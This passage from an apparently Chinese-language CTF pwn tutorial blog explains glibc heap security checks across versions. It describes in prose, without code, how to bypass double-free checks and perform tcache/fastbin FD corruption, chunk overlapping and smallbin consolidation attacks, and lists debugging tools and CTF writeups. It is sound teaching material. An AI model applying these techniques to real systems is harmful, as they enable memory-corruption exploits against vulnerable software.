<li>攻击意义： 如果你能劫持这个管理结构，你就能控制整个线程的堆分配。</li>
</ul>
</li>
<li><strong>安全检查 (Key)：</strong><ul>
<li>Tcache是单向链表，原本不需要<code>bk</code>指针。</li>
<li>但是为了防止 <strong>Double Free</strong>（双重释放），glibc会在空闲Tcache Chunk 的<code>bk</code>位置存储一个 <strong><code>tcache key</code></strong>（通常指向 <code>tcache_perthread_struct</code> 的地址）。</li>
<li>当你释放一个块时，系统会检查 <code>bk</code> 位置是否等于这个 key，如果是，则遍历链表检查是否重复释放。</li>
</ul>
</li>
</ul>
<p><br><br>不同libc版本的安全检查以及分配策略都是不太一样的。</p>
<h3 id="Glibc-2-31"><a href="#Glibc-2-31" class="headerlink" title="Glibc 2.31"></a><strong>Glibc 2.31</strong></h3><p><img src="/images/image-20251127114018747.png" class="lazyload" data-srcset="/images/image-20251127114018747.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127114018747"></p>
<p><strong>1. Fastbin 的检查：</strong></p>
<p>Fastbin 是单向链表，性能仅次于 Tcache。</p>
<ul>
<li><strong>Malloc:</strong><ul>
<li><strong><code>alloc_size == stored size</code> (Size Integrity)</strong><ul>
<li>含义： 当从 Fastbin 取出一个块时，系统会检查这个块头部的 <code>size</code> 字段，看它是否真的属于当前这个 Bin 的大小范围。</li>
<li>攻击后果： 如果你想伪造一个 Fastbin Chunk（比如在栈上伪造），你必须确保伪造地址的偏移处有一个正确的 <code>size</code> 数值，否则程序会崩溃。</li>
</ul>
</li>
</ul>
</li>
<li><strong>Free:</strong><ul>
<li><strong><code>valid next size</code></strong>: 检查内存中<strong>下一个</strong>物理相邻块的大小字段是否合理。这是为了防止因溢出导致的元数据损坏。</li>
<li><strong><code>addr != head</code> (弱 Double Free 检查)</strong>:<ul>
<li>它只检查链表的<strong>头节点</strong>是不是当前要释放的地址。</li>
<li>绕过： 这就是经典的 <strong>ABA 问题</strong>。你释放 A，链表头是 A；你释放 B，链表头变成 B；你<strong>再次</strong>释放 A，因为此时链表头是 B (A != B)，检查通过。A 成功进入链表两次。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>2. Smallbin的检查：</strong></p>
<p>Smallbin 是双向链表，管理较大内存，安全性最高。</p>
<ul>
<li><strong>Malloc:</strong><ul>
<li><strong><code>bk-&gt;fd == addr</code> (Safe Unlink)</strong><ul>
<li>含义： 这是最著名的堆保护机制。当从双向链表取出一个块（Unlink）时，系统会检查：这个块的<strong>后一个块的前向指针</strong>，是否指回这个块本身？</li>
<li>公式： <code>P-&gt;bk-&gt;fd == P</code></li>
<li>攻击后果： 这使得经典的“Unlink 攻击”（通过修改 fd/bk 实现任意地址写）在现代 glibc 中基本失效，除非你能同时伪造好 fd 和 bk 指向的内存内容。</li>
</ul>
</li>
</ul>
</li>
<li><strong>Free:</strong><ul>
<li><code>chunk is in-use</code>:<ul>
<li>它会检查<strong>下一个</strong>物理相邻 Chunk 的 <code>prev_in_use</code> 位（P-bit）。如果 P-bit 为 0，说明当前块已经是空闲状态了，系统就会报错，防止 Double Free。</li>
</ul>
</li>
<li><code>unsorted head is valid</code>: 针对 Unsorted Bin 的完整性检查。</li>
</ul>
</li>
</ul>
<p><strong>3. Chunk Consolidation (块合并)</strong></p>
<p>这部分指的是当Smallbin/Largebin发生物理合并时（比如你释放一个块，它发现前一个块也是空闲的，就要合并成一个大块）。</p>
<ul>
<li><strong><code>prevsize == chunksize(p)</code></strong>:<ul>
<li>含义： 当前块的 <code>prev_size</code> 脚标，必须等于前一个块头部的 <code>size</code>。</li>
<li>目的： 防止 Off-by-one 漏洞利用（比如 Poison Null Byte 攻击）。如果攻击者偷偷改小了 <code>prev_size</code> 试图让堆管理器“吃掉”正在使用的内存，这个检查会拦截。</li>
</ul>
</li>
<li><strong><code>Valid doubly linked list pointers</code></strong>:<ul>
<li>在合并过程中，被吞并的空闲块需要从链表中移除，此时会再次触发类似 Safe Unlink 的检查。</li>
</ul>
</li>
</ul>
<p><img src="/images/image-20251127114037904.png" class="lazyload" data-srcset="/images/image-20251127114037904.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127114037904"></p>
<p><strong>1. Malloc 时的检查：无</strong></p>
<ul>
<li><p>它不检查取出的 Chunk 大小是否正确。</p>
</li>
<li><p>它不检查指针是否对齐。</p>
</li>
<li>它直接相信链表头部的指针（FD）。</li>
</ul>
<p><strong>2. Free 时的检查：</strong></p>
<p>虽然 <code>malloc</code> 不管，但在 <code>free</code> 时 Tcache 还是做了一些防御，主要是为了防止 <strong>Double Free</strong>。</p>
<ul>
<li><strong><code>valid stored size</code></strong><ul>
<li>检查你要释放的地址处的 <code>size</code> 字段是否合法（比如大小不能太离谱，且必须对齐）。</li>
</ul>
</li>
<li><strong><code>key/bk != tcache_key || chunk not in tcache list</code> (Double Free 检查)</strong><ul>
<li>背景： Tcache 是单向链表，本来不需要 <code>bk</code> 指针。glibc 这里复用了 <code>bk</code> 的位置（用户数据的第 8-15 字节）来存放一个随机生成的 <strong><code>tcache_key</code></strong>（通常指向堆管理结构）。</li>
<li><strong>逻辑：</strong> 当调用 <code>free(ptr)</code> 时：<ol>
<li>系统先检查 <code>ptr-&gt;bk</code> 是否等于 <code>tcache_key</code>。</li>
<li><strong>如果不等于：</strong> 系统认为这是一个新释放的块，直接放入链表，并把 key 写入 <code>bk</code> 位置。</li>
<li><strong>如果等于：</strong> 系统怀疑你正在 Double Free。于是它会<strong>遍历整个链表</strong>，检查里面是不是真的已经有了这个 Chunk。</li>
</ol>
</li>
<li><strong>绕过思路：</strong> 如果能利用 Use-After-Free (UAF) 改写该 Chunk 的 <code>bk</code> 位置（把 key 覆盖掉），就可以绕过这个检查，再次释放它，从而实现 Double Free。</li>
</ul>
</li>
</ul>
<h3 id="Glibc-2-41"><a href="#Glibc-2-41" class="headerlink" title="Glibc 2.41"></a><strong>Glibc 2.41</strong></h3><p>随着libc版本的更新，发生了很多的变化，所以很多针对老版本libc的heap exploitation的攻击没有办法应用在新版的libc里。</p>
<p><img src="/images/image-20251212211140806.png" class="lazyload" data-srcset="/images/image-20251212211140806.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251212211140806"></p>
<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a><strong>攻击方法</strong></h3><h4 id="1-Fastbin-Tcache-FD-Corruption-FD-指针篡改"><a href="#1-Fastbin-Tcache-FD-Corruption-FD-指针篡改" class="headerlink" title="1. Fastbin/Tcache FD Corruption (FD 指针篡改)"></a><strong>1. Fastbin/Tcache FD Corruption (FD 指针篡改)</strong></h4><p><strong>利用 Use-After-Free (UAF) 实现任意地址分配（Arbitrary Chunk Allocation）。</strong></p>
<ul>
<li><strong>场景：</strong> 针对单向链表（Tcache 或 Fastbin）。</li>
<li><strong>步骤：</strong><ol>
<li>释放一个Chunk A，它进入空闲链表 。</li>
<li>利用悬挂指针（UAF）修改Chunk A的<code>fd</code>指针，将其指向目标地址<code>&lt;victim&gt;</code>（例如栈地址或 libc 中的 hook） 。</li>
<li>第一次<code>malloc</code>取出 Chunk A 。</li>
<li>第二次<code>malloc</code>就会返回 <code>&lt;victim&gt;</code> 地址，从而控制该区域内存 。</li>
</ol>
</li>
</ul>
<p><strong>图示：</strong></p>
<p><img src="/images/image-20251127132419482.png" class="lazyload" data-srcset="/images/image-20251127132419482.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132419482"></p>
<p><img src="/images/image-20251127132440833.png" class="lazyload" data-srcset="/images/image-20251127132440833.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132440833"></p>
<h4 id="2-Size-Corruption-大小篡改-Overlapping-Chunks"><a href="#2-Size-Corruption-大小篡改-Overlapping-Chunks" class="headerlink" title="2. Size Corruption (大小篡改 / Overlapping Chunks)"></a><strong>2. Size Corruption (大小篡改 / Overlapping Chunks)</strong></h4><p><strong>通过修改 Chunk 的头部大小字段，制造堆块重叠。</strong></p>
<ul>
<li><strong>场景：</strong>内存中有连续的Chunk A, B, C。</li>
<li><strong>步骤：</strong><ol>
<li>利用Chunk A的溢出漏洞，覆盖Chunk B的头部 。</li>
<li>将Chunk B的 <code>size</code> 改大（例如从 0x21 改为 0x41），使其覆盖到Chunk C 。</li>
<li>释放Chunk B 。</li>
<li>重新申请一个较大的内存（例如 0x38），系统会分配原 B 的空间，但由于大小已变，新的Chunk D会覆盖原本的Chunk C 。</li>
<li><strong>结果：</strong> 攻击者可以通过编辑Chunk D来控制Chunk C的内容（即使用户认为 C 仍在使用中） 。</li>
</ol>
</li>
</ul>
<p><strong>图示：</strong></p>
<p><img src="/images/image-20251127132620777.png" class="lazyload" data-srcset="/images/image-20251127132620777.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132620777"></p>
<p><img src="/images/image-20251127132629654.png" class="lazyload" data-srcset="/images/image-20251127132629654.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132629654"></p>
<p><img src="/images/image-20251127132641176.png" class="lazyload" data-srcset="/images/image-20251127132641176.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132641176"></p>
<p><img src="/images/image-20251127132655280.png" class="lazyload" data-srcset="/images/image-20251127132655280.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132655280"></p>
<h4 id="3-Smallbin-Consolidation-Smallbin-合并攻击"><a href="#3-Smallbin-Consolidation-Smallbin-合并攻击" class="headerlink" title="3. Smallbin Consolidation (Smallbin 合并攻击)"></a><strong>3. Smallbin Consolidation (Smallbin 合并攻击)</strong></h4><p><strong>利用的是 <code>malloc_consolidate</code> 和 <code>unlink</code> 机制来构造重叠块（Overlapping Chunks）或绕过某些限制。</strong></p>
<ul>
<li><strong>前提：</strong> 利用 <code>prev_size</code> 和 <code>prev_in_use</code> 位的逻辑。</li>
<li><strong>布局：</strong> 连续的 Chunk A, B, C, D。</li>
<li><strong>步骤：</strong><ol>
<li>释放Chunk A（放入 Unsorted/Smallbin，建立合法的 fd/bk 指针） 。</li>
<li>利用Chunk B的溢出，修改Chunk C的头部：<ul>
<li>将C的 <code>prev_size</code> 修改为 <code>size(A) + size(B)</code>（伪造前一个块非常大） 。</li>
<li>将C的 <code>prev_in_use</code> 标志位置0（欺骗 C 认为前一个大块是空闲的） 。</li>
</ul>
</li>
<li><strong>绕过检查 (glibc 2.29+)：</strong> 需要修改Chunk A的<code>size</code>字段，使其等于伪造的<code>prev_size</code>，以通过完整性检查 。</li>
<li>释放Chunk C 。</li>
<li><strong>触发合并：</strong> glibc 检测到 C 的 <code>prev_in_use</code> 为 0，根据 <code>prev_size</code> 向后合并，吞并了正在使用的 Chunk B，与Chunk A合并成一个巨大的空闲块 。</li>
<li>重新申请一个大块E 。</li>
<li><strong>结果：</strong> Chunk E完全包含了仍在“使用中”的 Chunk B，攻击者完全控制了 B 的数据 。</li>
</ol>
</li>
</ul>
<p><strong>图示：</strong></p>
<p><img src="/images/image-20251127133204988.png" class="lazyload" data-srcset="/images/image-20251127133204988.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133204988"></p>
<p><img src="/images/image-20251127133220804.png" class="lazyload" data-srcset="/images/image-20251127133220804.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133220804"></p>
<p><img src="/images/image-20251127133233311.png" class="lazyload" data-srcset="/images/image-20251127133233311.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133233311"></p>
<p><img src="/images/image-20251127133248009.png" class="lazyload" data-srcset="/images/image-20251127133248009.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133248009"></p>
<p><img src="/images/image-20251127133302587.png" class="lazyload" data-srcset="/images/image-20251127133302587.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133302587"></p>
<p><img src="/images/image-20251127133337054.png" class="lazyload" data-srcset="/images/image-20251127133337054.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133337054"></p>
<h3 id="推荐工具"><a href="#推荐工具" class="headerlink" title="推荐工具"></a><strong>推荐工具</strong></h3><ul>
<li><p><strong>forkever (by haxkor)</strong> </p>
<ul>
<li><p><strong>功能：</strong> 允许模拟堆操作并支持<strong>检查点 (Checkpoints)</strong> 功能 。</p>
</li>
<li><p><strong>作用：</strong> 在编写 Exploit 时，经常需要反复尝试某一步骤。这个工具可能类似于虚拟机的快照功能，让你在堆的某个特定状态下反复尝试不同的攻击载荷，而不需要每次都重新启动程序，大大提高了调试效率。</p>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/haxkor/forkever">https://github.com/haxkor/forkever</a></li>
</ul>
</li>
<li><p><strong>pwndbg-gui (by AlEscher)</strong> </p>
<ul>
<li><p><strong>功能：</strong> 为著名的 GDB 插件 <code>pwndbg</code> 提供图形化界面，并增强了堆上下文 (Heap Context) 的显示 。</p>
</li>
<li><p><strong>作用：</strong> 原生的 GDB/pwndbg 是命令行界面，查看堆链表时比较抽象。这个工具通过 GUI 可视化展示 Bin 的状态，让你更直观地看到堆块是如何链接的。</p>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/AlEscher/pwndbg-gui">https://github.com/AlEscher/pwndbg-gui</a></li>
</ul>
</li>
<li><p><strong>ptrfind (by ChaChaNop-Slide)</strong></p>
<ul>
<li><p><strong>功能：</strong> 寻找指针和指针链，以利用任意读写 (Arbitrary Read/Write) 。</p>
</li>
<li><p><strong>作用：</strong> 在堆利用中，经常需要通过多级指针跳转找到目标地址（比如通过 <code>environ</code> 找栈地址）。这个工具能自动化寻找这些指针路径，省去了人工计算偏移的繁琐工作。</p>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/ChaChaNop-Slide/ptrfind">https://github.com/ChaChaNop-Slide/ptrfind</a></li>
</ul>
</li>
<li><p><strong>heapvis (by Staeves)</strong> </p>
<ul>
<li><p><strong>功能：</strong> 专门针对 <strong>libc 2.31</strong> 版本的堆可视化工具 。</p>
</li>
<li><p><strong>作用：</strong> 配合本课程讲授的 libc 版本（2.31），将抽象的堆内存布局画出来，帮助你理解 Chunk 的排列和状态。</p>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Staeves/heapvis">https://github.com/Staeves/heapvis</a></li>
</ul>
</li>
</ul>
<h3 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a><strong>学习资料</strong></h3><ul>
<li><strong>how2heap</strong><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></li>
</ul>
</li>
<li><strong>Malloc Maleficarium</strong><ul>
<li>比较古早但很经典的文章。</li>
<li><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/40638/MallocMaleficarum.txt.html">https://packetstormsecurity.com/files/40638/MallocMaleficarum.txt.html</a></li>
<li>不知道为什么Chrome访问这个网址会有问题，但是Firefox就可以。</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://heap-exploitation.dhavalkapil.com/">https://heap-exploitation.dhavalkapil.com/</a></li>
</ul>
<h3 id="常用pwndbg命令"><a href="#常用pwndbg命令" class="headerlink" title="常用pwndbg命令"></a><strong>常用pwndbg命令</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 概览</span></span><br><span class="line">heap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细模式</span></span><br><span class="line">heap -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 看某个地址附近/对应的 heap 信息</span></span><br><span class="line">heap 0x405000</span><br><span class="line"></span><br><span class="line">bins</span><br><span class="line"></span><br><span class="line">tcache</span><br></pre></td></tr></table></figure>
<h2 id="题目分类"><a href="#题目分类" class="headerlink" title="题目分类"></a><strong>题目分类</strong></h2><ol>
<li><strong>Pwn相关基础知识</strong>：<ol>
<li><a href="https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/HTB-Questionnaire-Writeup/">HTB Questionnaire Writeup</a></li>
<li><a href="https://archer-baiyi.github.io/2025/08/21/CTF/Pwn/HTB-Lesson-Writeup/">HTB Lesson Writeup</a></li>
</ol>
</li>
<li><strong>Buffer Overflow</strong>：<ol>
<li><strong><strong>结构体字段劫持</strong></strong>：<ol>
<li><a href="https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello-pwn-Writeup/">攻防世界 hello_pwn Writeup</a></li>
</ol>
</li>
<li><strong>ROP</strong>：<ol>
<li><strong>ret2shellcode</strong>：<ol>
<li><a href="https://archer-baiyi.github.io/2025/06/11/CTF/Pwn/HTB-Regularity-Writeup/">HTB Regularity Writeup</a></li>
</ol>
</li>
<li><strong>ret2text</strong>：<ol>
<li><a href="https://archer-baiyi.github.io/2025/10/04/CTF/Pwn/CTF-show-Pwn%E5%85%A5%E9%97%A8/#Pwn38">CTF.show Pwn入门 Pwn 38</a></li>
<li><a href="https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0-Writeup/">攻防世界 level0 Writeup</a></li>
<li><a href="https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup/">TJCTF 2025 pwn/i-love-birds Writeup</a> </li>
</ol>
</li>
<li><strong>ret2plt</strong>：<ol>
<li><a href="https://archer-baiyi.github.io/2025/10/04/CTF/Pwn/CTF-show-Pwn%E5%85%A5%E9%97%A8/#Pwn40">CTF.show Pwn入门 Pwn 40</a></li>
<li><a href="https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2-Writeup/">攻防世界 level2 Writeup</a> （32位程序）</li>
<li><a href="https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/HTB-You-know-0xDiablos-Writeup/">HTB You_know_0xDiablos Writeup</a> （32位程序）</li>
</ol>
</li>
<li><strong>ret2libc</strong>：<ol>
<li><a href="https://archer-baiyi.github.io/2025/10/04/CTF/Pwn/CTF-show-Pwn%E5%85%A5%E9%97%A8/#Pwn46">CTF.show Pwn入门 Pwn 46</a></li>
</ol>
</li>
<li>5</li>
</ol>
</li>
</ol>
</li>
<li><strong>格式化字符串漏洞</strong>：<ol>
<li><a href="https://archer-baiyi.github.io/2025/08/18/CTF/Pwn/HTB-racecar-Writeup/">HTB racecar Writeup</a>（利用格式化字符串漏洞读取信息。）</li>
<li><a href="https://archer-baiyi.github.io/2025/05/19/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb-Writeup/">攻防世界 CGfsb Writeup</a> （利用格式化字符串漏洞修改目标变量的值。）</li>
</ol>
</li>
<li><strong>堆利用</strong>：</li>
</ol>

  </div>
  
  
    
    <div class='footer'>
       <!-- 参考资料、相关资料等 -->
      
       <!-- 相关文章 -->
      
      <!-- 版权声明组件 -->
      
      <!-- 打赏组件 -->
      
    </div>
  
  
    


  <div class='article-meta' id="bottom">
    <div class='new-meta-box'>
      
        
          <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-05-12T17:01:08+02:00">
  <a class='notlink'>
    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：May 12, 2025</p>
  </a>
</div>

        
      
        
          
  <div class="new-meta-item share -mob-share-list">
  <div class="-mob-share-list share-body">
    
      
        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/&title=CTF Pwn 入门 - Hexo&summary=零基础Pwn入门"
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/&title=CTF Pwn 入门 - Hexo&summary=零基础Pwn入门"
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="http://service.weibo.com/share/share.php?url=https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/&title=CTF Pwn 入门 - Hexo&summary=零基础Pwn入门"
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
    
      
    
  </div>
</div>



        
      
    </div>
    <!-- Custom Files bottomMeta begin -->
    
    <!-- Custom Files bottomMeta end -->
  </div>


  
  

  
    <div class="prev-next">
      
        <a class='prev' href='/en/2025/05/17/CTF/Crypto/Python%E5%86%85%E7%BD%AE%E7%9A%84%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E/'>
          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Python内置的哈希函数的碰撞</p>
          <p class='content'>hash()Python拥有一个内置的哈希函数hash()，可以在Python 标准库文档找到对应的解释：

（来源：https://docs.python.org/3/library/stdt...</p>
        </a>
      
      
        <a class='next' href='/en/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0-Writeup/'>
          <p class='title'>攻防世界 level0 Writeup<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
          <p class='content'>观察用ida打开拿到的文件会看到主程序（使用F5可以将机器码反编译成伪代码）：

查看 vulnerable_function：

发现read的漏洞。
接着便是需要查看Stack的结构。点击这...</p>
        </a>
      
    </div>
  
  <!-- 文章推荐 -->
  
  
  <!-- Custom Files postEnd begin-->
  
  <!-- Custom Files postEnd end-->
</article>


  

  





</div>
<aside id='l_side' itemscope itemtype="https://schema.org.cn/WPSideBar">
  

  
    
    
      
    
  


<div class="widget-sticky">

  
  


<section class="widget toc-wrapper desktop mobile" id="toc-div" >
  
  <header>
    
      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
    
  </header>


  <div class='content'>
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%EF%BC%88Address-space%EF%BC%8CProzess-Adressraum%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">地址空间（Address space，Prozess Adressraum）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X86%E6%B1%87%E7%BC%96"><span class="toc-number">1.2.</span> <span class="toc-text">X86汇编</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget"><span class="toc-number">1.3.</span> <span class="toc-text">Gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%80%A7%E6%A3%80%E6%9F%A5"><span class="toc-number">2.</span> <span class="toc-text">安全性检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GDB"><span class="toc-number">3.1.</span> <span class="toc-text">GDB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">3.1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Pwndbg"><span class="toc-number">3.1.2.</span> <span class="toc-text">安装Pwndbg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.3.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%81%8F%E7%A7%BB"><span class="toc-number">3.1.4.</span> <span class="toc-text">确定返回地址偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">3.1.5.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-Ghidra"><span class="toc-number">3.2.</span> <span class="toc-text">IDA&#x2F;Ghidra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwntools"><span class="toc-number">3.3.</span> <span class="toc-text">Pwntools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8-API%EF%BC%88%E6%8C%89%E4%BB%BB%E5%8A%A1%E5%88%86%E7%B1%BB%EF%BC%89"><span class="toc-number">3.3.2.</span> <span class="toc-text">常用 API（按任务分类）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.3.3.</span> <span class="toc-text">模板</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ropgadget"><span class="toc-number">3.4.</span> <span class="toc-text">Ropgadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">漏洞以及利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA-Buffer-Overflow"><span class="toc-number">5.</span> <span class="toc-text">溢出 Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E-%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞&#x2F;常见危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93%E5%AD%97%E6%AE%B5%E5%8A%AB%E6%8C%81"><span class="toc-number">5.2.</span> <span class="toc-text">结构体字段劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP%EF%BC%88Return-Oriented-Programming%EF%BC%89"><span class="toc-number">5.3.</span> <span class="toc-text">ROP（Return Oriented Programming）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2text"><span class="toc-number">5.3.1.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">5.3.2.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Shellcode"><span class="toc-number">5.3.2.1.</span> <span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 